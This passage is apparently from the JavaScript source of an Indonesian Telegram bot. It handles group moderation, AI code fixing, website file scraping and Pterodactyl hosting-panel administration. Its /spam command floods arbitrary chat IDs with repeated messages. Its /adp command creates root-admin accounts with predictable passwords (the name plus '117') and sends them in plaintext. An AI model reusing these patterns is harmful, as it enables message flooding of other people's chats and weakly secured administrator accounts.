        ctx.reply("❌ Gagal pin pesan: " + err.message);
    }
});

// ===== Command Unpin =====
bot.command("unpin", async (ctx) => {
    if (!(await isAdmin(ctx))) return ctx.reply("❌ Hanya admin yang bisa menggunakan perintah ini.");
    try {
        await ctx.telegram.unpinChatMessage(ctx.chat.id);
        ctx.reply("✅ Pesan teratas berhasil di-unpin!");
    } catch (err) {
        ctx.reply("❌ Gagal unpin pesan: " + err.message);
    }
});

// ===== Command Promote =====
bot.command("promote", async (ctx) => {
    if (!(await isAdmin(ctx))) return ctx.reply("❌ Hanya admin yang bisa menggunakan perintah ini.");

    const args = ctx.message.text.split(" ");
    let userId;
    let customTitle = "";

    if (ctx.message.reply_to_message) {
        userId = ctx.message.reply_to_message.from.id;
        customTitle = args.slice(1).join(" ") || "Admin";
    } else if (args.length >= 2) {
        const mention = args[1];
        customTitle = args.slice(2).join(" ") || "Admin";

        if (mention.startsWith("@")) {
            try {
                const user = await ctx.telegram.getChat(mention);
                userId = user.id;
            } catch {
                return ctx.reply("❌ Tidak bisa menemukan user " + mention);
            }
        } else {
            userId = parseInt(mention);
        }
    } else {
        return ctx.reply("❌ Gunakan format: /promote ( reply pesan ) <tittle>");
    }

    try {
        await ctx.telegram.promoteChatMember(ctx.chat.id, userId, {
            can_manage_chat: true,
            can_change_info: true,
            can_delete_messages: true,
            can_invite_users: true,
            can_pin_messages: true,
            can_manage_video_chats: true,
            can_restrict_members: true,
            can_promote_members: false,
        });
        await ctx.telegram.setChatAdministratorCustomTitle(ctx.chat.id, userId, customTitle);
        ctx.reply(`✅ Berhasil promote <a href="tg://user?id=${userId}">user</a> sebagai *${customTitle}*`, { parse_mode: "HTML" });
    } catch (err) {
        ctx.reply("❌ Gagal promote: " + err.message);
    }
});

// ===== Command Demote =====
bot.command("demote", async (ctx) => {
    if (!(await isAdmin(ctx))) return ctx.reply("❌ Hanya admin yang bisa menggunakan perintah ini.");

    const args = ctx.message.text.split(" ");
    let userId;

    if (ctx.message.reply_to_message) {
        userId = ctx.message.reply_to_message.from.id;
    } else if (args.length >= 2) {
        const mention = args[1];
        if (mention.startsWith("@")) {
            try {
                const user = await ctx.telegram.getChat(mention);
                userId = user.id;
            } catch {
                return ctx.reply("❌ Tidak bisa menemukan user " + mention);
            }
        } else {
            userId = parseInt(mention);
        }
    } else {
        return ctx.reply("❌ Gunakan format: /demote ( reply pesan )");
    }

    try {
        await ctx.telegram.promoteChatMember(ctx.chat.id, userId, {
            can_manage_chat: false,
            can_change_info: false,
            can_delete_messages: false,
            can_invite_users: false,
            can_pin_messages: false,
            can_manage_video_chats: false,
            can_restrict_members: false,
            can_promote_members: false,
            is_anonymous: false,
        });
        ctx.reply(`✅ Berhasil demote <a href="tg://user?id=${userId}">user</a>`, { parse_mode: "HTML" });
    } catch (err) {
        ctx.reply("❌ Gagal demote: " + err.message);
    }
});

/* ===== CMD: cekid ===== */
bot.command("cekid", async (ctx) => {
  if (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup") {
    return ctx.reply("❌ Hanya untuk grup!");
  }
  ctx.reply(
    `Nama Group: ${ctx.chat.title || "-"}\n🆔 ID-Group: ${ctx.chat.id}\nType: ${ctx.chat.type}\nMembers : ${
      Object.keys(memberCache[String(ctx.chat.id)] || {}).length
    }`
  );
});

/* ===== CMD: antipromosi ===== */
bot.command("antipromosi", async (ctx) => {
  if (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup") {
    return ctx.reply("❌ Command ini hanya bisa dipakai di grup!");
  }

  const member = await ctx.telegram.getChatMember(ctx.chat.id, ctx.from.id);
  if (!["administrator", "creator"].includes(member.status)) {
    return ctx.reply("❌ Hanya admin yang bisa mengatur AntiPromosi!");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const opt = (args[0] || "").toLowerCase();
  const chatId = String(ctx.chat.id);

  if (opt === "on") {
    antiPromosi[chatId] = true;
    return ctx.reply("✅ AntiPromosi AKTIF.");
  } else if (opt === "off") {
    antiPromosi[chatId] = false;
    return ctx.reply("❌ AntiPromosi NONAKTIF.");
  } else {
    return ctx.reply("Gunakan: /antipromosi on atau /antipromosi off");
  }
});

/* ===== CMD: alltag ===== */
bot.command("alltag", async (ctx) => {
  if (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup") {
    return ctx.reply("❌ Hanya untuk grup.");
  }

  const member = await ctx.telegram.getChatMember(ctx.chat.id, ctx.from.id);
  if (!["administrator", "creator"].includes(member.status)) {
    return ctx.reply("❌ Hanya admin yang bisa gunakan /alltag.");
  }

  const chatId = String(ctx.chat.id);
  const args = ctx.message.text.split(" ").slice(1);
  let count = parseInt(args[0]) || MAX_ALLTAG;
  if (count > MAX_ALLTAG) count = MAX_ALLTAG;

  const cache = memberCache[chatId] || {};
  const users = Object.values(cache)
    .sort((a, b) => b.lastSeen - a.lastSeen)
    .slice(0, count);

  if (!users.length) return ctx.reply("❌ Tidak ada member di cache.");

  const mentions = users.map((u) =>
    u.username
      ? "@" + u.username
      : `<a href="tg://user?id=${u.id}">${escapeHtml(u.first_name || "user")}</a>`
  );

  const chunkSize = 20;
  for (let i = 0; i < mentions.length; i += chunkSize) {
    const chunk = mentions.slice(i, i + chunkSize).join(" ");
    await ctx.reply(chunk, { parse_mode: "HTML" }).catch(() => {});
    await new Promise((r) => setTimeout(r, 800));
  }
});

/* ===== CMD: spam ===== */
bot.command("spam", async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1);
    if (args.length < 2) return ctx.reply("Gunakan: /spam <jumlah> < id1, id2> <teks>");

    let count = parseInt(args[0]);
    if (isNaN(count) || count < 1) return ctx.reply("Jumlah tidak valid.");
    if (count > MAX_SPAM) count = MAX_SPAM;

    let targetIds = [];
    let textStartIndex = 1;
    let usingIds = false;

    if (/^\d+(,\d+)*$/.test(args[1])) {
      targetIds = args[1].split(",").map(id => parseInt(id)).filter(id => !isNaN(id));
      textStartIndex = 2;
      usingIds = true;
    } else {
      targetIds = [ctx.chat.id];
    }

    const text = args.slice(textStartIndex).join(" ");
    if (!text) return ctx.reply("❌ Teks spam kosong.");

    if (usingIds) {
      await ctx.reply(`⏳️ Mulai mengirim spam ke ${targetIds.length} chat ID...`);
    }

    for (const chatId of targetIds) {
      let successCount = 0;
      for (let i = 0; i < count; i++) {
        try {
          await ctx.telegram.sendMessage(chatId, text);
          successCount++;
        } catch (e) {
          console.error(`Gagal mengirim ke ${chatId}:`, e);
        }
        await new Promise(r => setTimeout(r, 500));
      }
      if (usingIds) {
        await ctx.reply(`✅ Selesai mengirim ${successCount}/${count} pesan ke chat ID ${chatId}.`);
      }
    }

    if (!usingIds) {
      await ctx.reply(`✅ Selesai spam ${count} pesan di chat ini.`);
    }

  } catch (err) {
    console.error("Unexpected error /spam:", err);
    return ctx.reply(`❌ Terjadi kesalahan.\nAlasan: ${err.message}`);
  }
});

bot.command("fixcode", async (ctx) => {
  const reply = ctx.message.reply_to_message;

  if (!reply || !reply.text) {
    return ctx.reply("❌ Balas kode program yang ingin diperbaiki dengan perintah /fixcode.");
  }

  const codeToFix = reply.text;
  const sessionId = ctx.from.id.toString();

  const ask = `Sempurnakan program ini dan perbaiki error:\n\n${codeToFix}`;
  const apiUrl = `https://fastrestapis.fasturl.cloud/aillm/gpt-4?ask=${encodeURIComponent(ask)}&session=${sessionId}`;

  try {
    await ctx.replyWithChatAction("typing");

    const { data } = await axios.get(apiUrl);
    const fixedCode = data.answer || "⚠️ Tidak ada respon dari AI.";

    // Pecah biar ga melebihi batas Telegram
    const chunks = fixedCode.match(/[\s\S]{1,3900}/g);
    for (const chunk of chunks) {
      await ctx.reply("```js\n" + chunk + "\n```", { parse_mode: "Markdown" });
    }
  } catch (err) {
    console.error("FIXCODE ERROR:", err.message);
    ctx.reply("❌ Terjadi kesalahan saat memperbaiki kode. Coba lagi nanti.");
  }
});

const { OpenAI } = require("openai");

const openai = new OpenAI({ apiKey: settings.OPENAI_API_KEY });
const pendingExplanations = {};

async function writeTempFileSafe(filename, content) {
  const safeName = (filename || "tmp.txt").replace(/[^a-z0-9.\-_]/gi, "_");
  const tmpPath = path.join(os.tmpdir(), `${Date.now()}_${safeName}`);
  fs.writeFileSync(tmpPath, content, "utf8");
  return tmpPath;
}

function detectLanguage(code) {
  const lower = code.toLowerCase();
  if (lower.includes("<?php")) return "PHP";
  if (lower.includes("import ") || lower.includes("def ") || lower.includes("print(")) return "Python";
  if (lower.includes("<html") || lower.includes("<!doctype html")) return "HTML";
  if (lower.includes("console.log") || lower.includes("require(") || lower.includes("function ")) return "JavaScript";
  if (lower.includes("public static void main") || lower.includes("class ")) return "Java";
  return "Auto";
}

// === CMD /fix ===
bot.command("fix", async (ctx) => {
  const reply = ctx.message.reply_to_message;
  if (!reply) {
    return ctx.reply("⚠️ Harus *reply* text kode atau file dengan /fix", { parse_mode: "Markdown" });
  }

  let code = "";
  let filename = "fixed.txt";

  if (reply.document) {
    const file = await ctx.telegram.getFile(reply.document.file_id);
    const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
    const res = await fetch(url);
    code = Buffer.from(await res.arrayBuffer()).toString("utf8");
    filename = reply.document.file_name || "fixed.txt";
  } else if (reply.text) {
    code = reply.text;
    filename = "reply_text.txt";
  } else {
    return ctx.reply("⚠️ Reply pesan text kode atau file .js/.html/.css dll");
  }

  pendingExplanations[ctx.from.id] = { code, filename };

  await ctx.reply(
    "⎙ Jelaskan detail error (contoh: `TypeError baris 3`). Atau tekan *Skip (Auto Fix)*",
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[
          { text: "Skip (Auto)", callback_data: `skip_auto_${ctx.from.id}` }
        ]]
      }
    }
  );
});

bot.on("callback_query", async (ctx) => {
  const data = ctx.callbackQuery.data;
  const chatId = ctx.callbackQuery.message.chat.id;
  const userId = ctx.from.id;

  if (data.startsWith("skip_auto_")) {
    const pending = pendingExplanations[userId];
    if (!pending) {
      await ctx.answerCbQuery("❌ Tidak ada kode pending untuk kamu.");
      return;
    }

    await ctx.answerCbQuery("⏳ Sedang fix kode error...");

    try {
      const lang = detectLanguage(pending.code);

      const completion = await openai.chat.completions.create({
        model: "gpt-4o-mini",
        messages: [
          { role: "system", content: "Kamu Adalah AI Fix Kings" },
          { role: "user", content: pending.code }
        ]
      });

      const result = completion.choices[0].message.content;

      let explanation = result;
      let fixedCode = result;
      const parts = result.split(/```/);

      if (parts.length >= 3) {
        explanation = parts[0].trim();
        fixedCode = parts[1].replace(/(js|javascript|py|java|php|html)/, "").trim();
      }

      const detailUser = "(tidak ada keterangan)";

      const explanationFormatted = [
        "⎙ Perbaikan Kode",
        `Bahasa: ${lang}`, 
        "",
        "Detail Pengguna",
        `> ${detailUser}`,
        "",
        "Ringkasan Kesalahan",
        explanation || "(analisis otomatis)"
      ].join("\n");

      await bot.telegram.sendMessage(chatId, explanationFormatted, { parse_mode: "Markdown" });

      if (fixedCode.length < 3500) {
        await bot.telegram.sendMessage(
          chatId,
          "📝 *Kode hasil fix:*\n```\n" + fixedCode + "\n```",
          { parse_mode: "Markdown" }
        );
      } else {
        await bot.telegram.sendDocument(
          chatId,
          { source: Buffer.from(fixedCode, "utf8"), filename: "fixed_" + pending.filename }
        );
      }

      delete pendingExplanations[userId];
    } catch (err) {
      console.error("AI error:", err);
      await bot.telegram.sendMessage(chatId, "❌ Gagal menganalisis: " + err.message);
    }
  }
});

bot.command("getcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ADMIN_ID)) {
    return ctx.reply("❌ Hanya ADMIN_ID yang bisa memakai command ini!");
  }

  const args = ctx.message.text.split(" ").slice(1);
  if (!args.length) {
    return ctx.reply("⚠️ Gunakan:\n/getcmd <nama_cmd>\n/getcmd .js <nama_cmd>");
  }

  const sendAsFile = args[0] === ".js";
  const keyword = sendAsFile ? args[1]?.toLowerCase() : args[0]?.toLowerCase();

  if (!keyword) {
    return ctx.reply("⚠️ Harap masukkan nama command.\nContoh: /getcmd .js <tourl>");
  }

  try {
    const filePath = path.join(__dirname, "bot.js");
    const code = fs.readFileSync(filePath, "utf8");

    let snippets = [];
    let calledFunctions = new Set();

    const regexCmd = new RegExp(
      `(bot\\.command\\(["'\`]${keyword}["'\`][\\s\\S]*?}\\);)`,
      "gi"
    );
    const cmdMatch = code.match(regexCmd);
    if (cmdMatch) {
      const cmdCode = cmdMatch.join("\n");
      snippets.push("// === COMMAND ===\n" + cmdCode);

      const funcCalls = [...cmdCode.matchAll(/([a-zA-Z0-9_]+)\s*\(/g)].map(
        (m) => m[1]
      );
      funcCalls.forEach((fn) => {
        if (fn !== keyword) calledFunctions.add(fn);
      });
    }

    const regexFunc = new RegExp(
      `(async\\s+function\\s+${keyword}\\s*\\([^)]*\\)\\s*{[\\s\\S]*?}|function\\s+${keyword}\\s*\\([^)]*\\)\\s*{[\\s\\S]*?})`,
      "gi"
    );
    const funcMatch = code.match(regexFunc);
    if (funcMatch) {
      snippets.push("// === FUNCTION / ASYNC FUNCTION ===\n" + funcMatch.join("\n"));
    }

    const regexOn = new RegExp(`(bot\\.on\\([^)]*,[\\s\\S]*?}\\);)`, "gi");
    const onMatches = code.match(regexOn);
    if (onMatches) {
      onMatches.forEach((m) => {
        if (m.toLowerCase().includes(keyword)) {
          snippets.push("// === EVENT HANDLER ===\n" + m);
        }
      });
    }

    for (const fn of calledFunctions) {
      const regexFn = new RegExp(
        `(async\\s+function\\s+${fn}\\s*\\([^)]*\\)\\s*{[\\s\\S]*?}|function\\s+${fn}\\s*\\([^)]*\\)\\s*{[\\s\\S]*?})`,
        "gi"
      );
      const fnMatch = code.match(regexFn);
      if (fnMatch) {
        snippets.push(`// === EXTRA FUNCTION (${fn}) ===\n` + fnMatch.join("\n"));
      }
    }

    if (!snippets.length) {
      return ctx.reply(`❌ Tidak ditemukan kode untuk '${keyword}'.`);
    }

    const finalSnippet = snippets.join("\n\n");

    if (sendAsFile) {
      const tmpPath = path.join(__dirname, `${keyword}.js`);
      fs.writeFileSync(tmpPath, finalSnippet, "utf8");
      await ctx.replyWithDocument({ source: tmpPath });
      fs.unlinkSync(tmpPath);
    } else {
      const chunks = finalSnippet.match(/[\s\S]{1,3900}/g);
      for (const chunk of chunks) {
        await ctx.reply("```js\n" + chunk + "\n```", { parse_mode: "Markdown" });
      }
    }
  } catch (err) {
    console.error("Error getcmd:", err.message);
    ctx.reply("❌ Gagal membaca file source code.");
  }
});

// === FILTER RESOURCE ===
function isOnlineUrl(url) {
  if (!url) return false;
  const u = url.trim();
  if (/^(data:|javascript:|mailto:|tel:|#)/i.test(u)) return false;
  if (!/^https?:\/\//i.test(u)) return false;
  return true;
}

function isWantedFile(url) {
  return /\.(html?|js|ts|css|json|vue|php|py|java|c|cpp|cs|rb|go|rs|sh|xml|yml|yaml|md)$/i.test(url);
}

bot.command("getcode", async (ctx) => {
  try {
    const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);
    if (!isChannelMember || !isGroupMember) {
      return ctx.reply(
        "❌ Anda harus join *channel & group* dulu sebelum memakai command",
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
              [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
            ]
          }
        }
      );
    }
  } catch (e) {
    return ctx.reply("❌ Gagal memeriksa keanggotaan channel/group: " + (e.message || e));
  }

  const args = ctx.message.text.split(" ").slice(1);
  let startUrl = args[0];

  if (!startUrl && ctx.message.reply_to_message) {
    const replyText = ctx.message.reply_to_message.text || "";
    if (/^https?:\/\//i.test(replyText.trim())) {
      startUrl = replyText.trim();
    }
  }

  if (!startUrl) return ctx.reply("Gunakan: /getcode <url> atau reply URL dengan /getcode");
  if (!/^https?:\/\//i.test(startUrl)) return ctx.reply("URL harus diawali http:// atau https://");

  let userMax = MAX_FILES;
  if (args[1]) {
    const tryN = parseInt(args[1]);
    if (!isNaN(tryN) && tryN > 0 && tryN <= 200) userMax = tryN;
  }

  await ctx.reply(`🔎 Mulai ambil file dari web: ${startUrl}\nfile: ${userMax}`);

  const baseName = `site_${Date.now()}_${Math.floor(Math.random()*1000)}`;
  const tmpDir = path.join(__dirname, baseName);
  fs.mkdirSync(tmpDir);

  let htmlText;
  try {
    const r = await axios.get(startUrl, { timeout: FETCH_TIMEOUT, responseType: "text", maxRedirects: 5 });
    htmlText = r.data;
  } catch (e) {
    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch {}
    return ctx.reply("❌ Gagal fetch halaman utama: " + (e.message || e));
  }

  const indexPath = path.join(tmpDir, "index.html");
  fs.writeFileSync(indexPath, htmlText, "utf8");

  const resourceSet = new Set();

  const tagRegex = /<(script|link)[^>]*?(?:src|href)=["']?([^"'>\s]+)["']?/gi;
  let m;
  while ((m = tagRegex.exec(htmlText))) {
    if (m[2]) resourceSet.add(m[2]);
  }

  const inlineStyleRegex = /style=["'][^"']*url\(([^)]+)\)[^"']*["']/gi;
  while ((m = inlineStyleRegex.exec(htmlText))) {
    const raw = m[1].trim().replace(/^['"]|['"]$/g, "");
    if (raw) resourceSet.add(raw);
  }

  const resolved = [];
  for (const raw of resourceSet) {
    const full = resolveResourceUrl(startUrl, raw);
    if (isOnlineUrl(full) && isWantedFile(full)) resolved.push(full);
  }

  const queue = Array.from(new Set(resolved));
  const visited = new Set();
  let sentCount = 0;

  try {
    await ctx.replyWithDocument({ source: indexPath, filename: "index.html" });
  } catch {}

  while (queue.length && sentCount < userMax) {
    const fileUrl = queue.shift();
    if (visited.has(fileUrl)) continue;
    visited.add(fileUrl);

    try {
      const { data } = await fetchArrayBuffer(fileUrl);
      const urlObj = new URL(fileUrl);
      let filename = urlObj.pathname.split("/").pop() || `resource_${sentCount}`;
      if (!filename || filename === "/") filename = `${urlObj.hostname}_res_${sentCount}`;
      filename = sanitizeFilename(filename);

      const savePath = path.join(tmpDir, filename);
      fs.writeFileSync(savePath, Buffer.from(data));

      await ctx.replyWithDocument({ source: savePath, filename });
      sentCount++;

      await new Promise(r => setTimeout(r, SEND_DELAY));
    } catch (err) {
      console.error("failed fetch/send:", fileUrl, err && (err.message || err));
      await ctx.reply(`⚠️ Gagal download: ${fileUrl}`);
    }
  }

  setTimeout(() => {
    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch {}
  }, 9000);

  await ctx.reply(`✅ File selesai dikirim: ${sentCount} (batas: ${userMax}).`);
});

// CMD CREATE PANEL
bot.command("1gb", async (ctx) => {
  if (String(ctx.from.id) !== String(ADMIN_ID)) return ctx.reply("❌ Hanya ADMIN.");
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args.includes(",")) return ctx.reply("⚠️ Format: /1gb namapanel,idtele");
  const [username, target] = args.split(",");
  await createServer(ctx, username.trim(), target.trim(), username.trim() + "1gb", "1024", "30", "1024");
});

bot.command("2gb", async (ctx) => {
  if (String(ctx.from.id) !== String(ADMIN_ID)) return ctx.reply("❌ Hanya ADMIN.");
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args.includes(",")) return ctx.reply("⚠️ Format: /2gb namapanel,idtele");
  const [username, target] = args.split(",");
  await createServer(ctx, username.trim(), target.trim(), username.trim() + "2gb", "2048", "50", "2048");
});

bot.command("3gb", async (ctx) => {
  if (String(ctx.from.id) !== String(ADMIN_ID)) return ctx.reply("❌ Hanya ADMIN.");
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args.includes(",")) return ctx.reply("⚠️ Format: /3gb namapanel,idtele");
  const [username, target] = args.split(",");
  await createServer(ctx, username.trim(), target.trim(), username.trim() + "3gb", "3072", "70", "3072");
});

bot.command("4gb", async (ctx) => {
  if (String(ctx.from.id) !== String(ADMIN_ID)) return ctx.reply("❌ Hanya ADMIN.");
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args.includes(",")) return ctx.reply("⚠️ Format: /4gb namapanel,idtele");
  const [username, target] = args.split(",");
  await createServer(ctx, username.trim(), target.trim(), username.trim() + "4gb", "4096", "90", "4096");
});

bot.command("5gb", async (ctx) => {
  if (String(ctx.from.id) !== String(ADMIN_ID)) return ctx.reply("❌ Hanya ADMIN.");
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args.includes(",")) return ctx.reply("⚠️ Format: /5gb namapanel,idtele");
  const [username, target] = args.split(",");
  await createServer(ctx, username.trim(), target.trim(), username.trim() + "5gb", "5120", "110", "5120");
});

bot.command("6gb", async (ctx) => {
  if (String(ctx.from.id) !== String(ADMIN_ID)) return ctx.reply("❌ Hanya ADMIN.");
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args.includes(",")) return ctx.reply("⚠️ Format: /6gb namapanel,idtele");
  const [username, target] = args.split(",");
  await createServer(ctx, username.trim(), target.trim(), username.trim() + "6gb", "6144", "130", "6144");
});

bot.command("7gb", async (ctx) => {
  if (String(ctx.from.id) !== String(ADMIN_ID)) return ctx.reply("❌ Hanya ADMIN.");
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args.includes(",")) return ctx.reply("⚠️ Format: /7gb namapanel,idtele");
  const [username, target] = args.split(",");
  await createServer(ctx, username.trim(), target.trim(), username.trim() + "7gb", "7168", "150", "7168");
});

bot.command("8gb", async (ctx) => {
  if (String(ctx.from.id) !== String(ADMIN_ID)) return ctx.reply("❌ Hanya ADMIN.");
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args.includes(",")) return ctx.reply("⚠️ Format: /8gb namapanel,idtele");
  const [username, target] = args.split(",");
  await createServer(ctx, username.trim(), target.trim(), username.trim() + "8gb", "8192", "170", "8192");
});

bot.command("9gb", async (ctx) => {
  if (String(ctx.from.id) !== String(ADMIN_ID)) return ctx.reply("❌ Hanya ADMIN.");
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args.includes(",")) return ctx.reply("⚠️ Format: /9gb namapanel,idtele");
  const [username, target] = args.split(",");
  await createServer(ctx, username.trim(), target.trim(), username.trim() + "9gb", "9216", "190", "9216");
});

bot.command("10gb", async (ctx) => {
  if (String(ctx.from.id) !== String(ADMIN_ID)) return ctx.reply("❌ Hanya ADMIN.");
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args.includes(",")) return ctx.reply("⚠️ Format: /10gb namapanel,idtele");
  const [username, target] = args.split(",");
  await createServer(ctx, username.trim(), target.trim(), username.trim() + "10gb", "10240", "210", "10240");
});

bot.command("unli", async (ctx) => {
  if (String(ctx.from.id) !== String(ADMIN_ID)) return ctx.reply("❌ Hanya ADMIN.");
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args.includes(",")) return ctx.reply("⚠️ Format: /unli namapanel,idtele");
  const [username, target] = args.split(",");
  await createServer(ctx, username.trim(), target.trim(), username.trim() + "unli", "0", "0", "0");
});

bot.command("adp", async (ctx) => {
  try {
    if (String(ctx.from.id) !== String(ADMIN_ID)) return ctx.reply("❌ Hanya ADMIN_ID.");

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    if (!args.includes(",")) return ctx.reply("⚠️ Format: /adp namapanel,idtele");

    const [panelName, telegramId] = args.split(",").map((x) => x.trim());
    const password = panelName + "117";

    const res = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: `${panelName}@gmail.com`,
        username: panelName,
        first_name: panelName,
        last_name: "Admin",
        language: "en",
        root_admin: true,
        password,
      }),
    }).catch(() => null);

    if (!res) return ctx.reply("❌ Gagal menghubungi API.");
    const data = await res.json().catch(() => ({}));
    if (data.errors) return ctx.reply(`❌ Error:\n${JSON.stringify(data.errors[0], null, 2)}`);

    const user = data.attributes;
    await ctx.reply(
      `✅ Admin berhasil dibuat!\n\n🆔 ID: ${user.id}\n👤 Username: ${user.username}\n📧 Email: ${user.email}\n🌍 Login: ${domain}\n🔒 Password: ${password}`
    );

    await ctx.telegram.sendMessage(
      telegramId,
      `🔥 DATA ADMIN BARU 🔥\n\n🔗 Login: ${domain}\n👤 Username: ${user.username}\n🔒 Password: ${password}\n\n⚠️ Jangan disalahgunakan!`
    );
  } catch (err) {
    console.error("ADP ERROR:", err);
    ctx.reply("❌ Terjadi kesalahan saat membuat admin.");
  }
});

bot.command("listadp", async (ctx) => {
  try {
    if (String(ctx.from.id) !== String(ADMIN_ID)) return ctx.reply("❌ Hanya ADMIN_ID.");

    const res = await fetch(`${domain}/api/application/users`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
    }).catch(() => null);

    if (!res) return ctx.reply("❌ Gagal menghubungi API.");
    const data = await res.json().catch(() => ({}));

    let messageText = "📋 List Admin:\n\n";
    data.data.forEach((u) => {
      if (u.attributes.root_admin) {
        messageText += `🆔 ID: ${u.attributes.id}\n👤 Username: ${u.attributes.username}\n📧 Email: ${u.attributes.email}\n\n`;
      }
    });

    await ctx.reply(messageText || "❌ Tidak ada admin ditemukan.");
  } catch (err) {
    console.error("LISTADMIN ERROR:", err);
    ctx.reply("❌ Terjadi kesalahan saat mengambil list admin.");
  }
});

function escapeMarkdownV2(text) {
  if (!text) return "";
  return String(text).replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, "\\$1");
}

bot.command("listsrv", async (ctx) => {
  try {
    if (String(ctx.from.id) !== String(ADMIN_ID))
      return ctx.reply("❌ Hanya ADMIN_ID.");

    const res = await fetch(`${domain}/api/application/servers`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`, 
      },
    }).catch(() => null);

    if (!res) return ctx.reply("❌ Gagal menghubungi API.");
    const data = await res.json().catch(() => ({}));

    if (!data.data || !data.data.length) {
      return ctx.reply("❌ Tidak ada server ditemukan.");
    }

    let messageText = "📋 *List Server Aktif:*\n\n";
    for (const srv of data.data) {
      const s = srv.attributes;

      let status = "Unknown";
      try {
        const resStatus = await fetch(`${domain}/api/client/servers/${s.uuid}/resources`, {
          method: "GET",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: `Bearer ${pltc}`, 
          },
        });
        const dataStatus = await resStatus.json();
        status = dataStatus.attributes?.current_state || "Unknown";
      } catch {
        status = "Error";
      }

      messageText += `🆔 ID: ${escapeMarkdownV2(s.id)}\n`;
      messageText += `📛 Nama: ${escapeMarkdownV2(s.name)}\n`;
      messageText += `👤 User: ${escapeMarkdownV2(s.user)}\n`;
      messageText += `📡 Status: ${escapeMarkdownV2(status)}\n\n`;
    }

    await ctx.reply(messageText, { parse_mode: "MarkdownV2" });
  } catch (err) {
    console.error("LISTSRV ERROR:", err);
    ctx.reply("❌ Terjadi kesalahan saat mengambil list server.");
  }
});

bot.command("delsrv", async (ctx) => {
  try {
    if (String(ctx.from.id) !== String(ADMIN_ID)) 
      return ctx.reply("❌ Hanya ADMIN_ID.");

    const args = ctx.message.text.split(" ").slice(1);
    if (!args.length) 
      return ctx.reply("⚠️ Format: /delsrv <id_server>");

    const serverId = args[0].trim();

    const res = await fetch(`${domain}/api/application/servers/${serverId}`, {
      method: "DELETE",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
    }).catch(() => null);

    if (!res) return ctx.reply("❌ Gagal menghubungi API.");
    if (res.status === 204) {
      await ctx.reply(`✅ Server dengan ID ${serverId} berhasil dihapus.`);
    } else {
      const data = await res.json().catch(() => ({}));
      ctx.reply(`❌ Gagal menghapus server:\n${JSON.stringify(data, null, 2)}`);
    }
  } catch (err) {
    console.error("DELSRV ERROR:", err);
    ctx.reply("❌ Terjadi kesalahan saat menghapus server.");
  }
});

bot.command("deladp", async (ctx) => {
  try {
    if (String(ctx.from.id) !== String(ADMIN_ID)) return ctx.reply("❌ Hanya ADMIN_ID.");

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    if (!args) return ctx.reply("⚠️ Format: /delcadmin <id_user>");

    const userId = args.trim();

    const res = await fetch(`${domain}/api/application/users/${userId}`, {
      method: "DELETE",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
    });

    if (res.status === 204) {
      ctx.reply(`✅ Admin dengan ID ${userId} berhasil dihapus.`);
    } else {
      const data = await res.json();
      ctx.reply(`❌ Gagal menghapus admin:\n${JSON.stringify(data, null, 2)}`);
    }
  } catch (err) {
    console.error("DELCADMIN ERROR:", err);
    ctx.reply("❌ Terjadi kesalahan saat menghapus admin panel.");
  }
});

// ----- Command /play -----
bot.command("play", async (ctx) => {
  try {
    const senderId = ctx.from.id;

    const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);
    if (!isChannelMember || !isGroupMember) {
      return ctx.reply(
        "❌ Anda harus join *channel & group* dulu sebelum memakai command",
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
              [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
            ]
          }
        }
      );
    }

    let q = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!q && ctx.message.reply_to_message) {
      q = urlFrom(ctx) || txt({ message: ctx.message.reply_to_message });
    }
    if (!q) return ctx.reply("🎧 Ketik judul atau reply judul/link • ᴅᴇᴀᴛʜ ᴋɪɴɢs 👑");

    await ctx.sendChatAction("upload_audio");
    const isLink = /^https?:\/\/(www\.)?(youtube\.com|youtu\.be)\//i.test(q);
    const candidates = isLink ? [{ url: q, title: "", author: "" }] : await topVideos(q);
    if (!candidates.length) return ctx.reply("❌ Tidak ada hasil • ᴅᴇᴀᴛʜ ᴋɪɴɢs 👑");

